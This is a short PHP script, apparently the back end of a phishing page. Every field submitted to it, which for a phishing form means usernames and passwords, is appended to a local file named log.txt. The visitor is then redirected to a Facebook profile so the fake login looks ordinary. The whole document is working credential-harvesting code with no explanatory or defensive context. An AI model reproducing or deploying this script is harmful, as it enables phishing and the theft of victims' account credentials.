<?php
header ('location: https://www.facebook.com/prem.sagar.921');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value){
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
	
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;

?>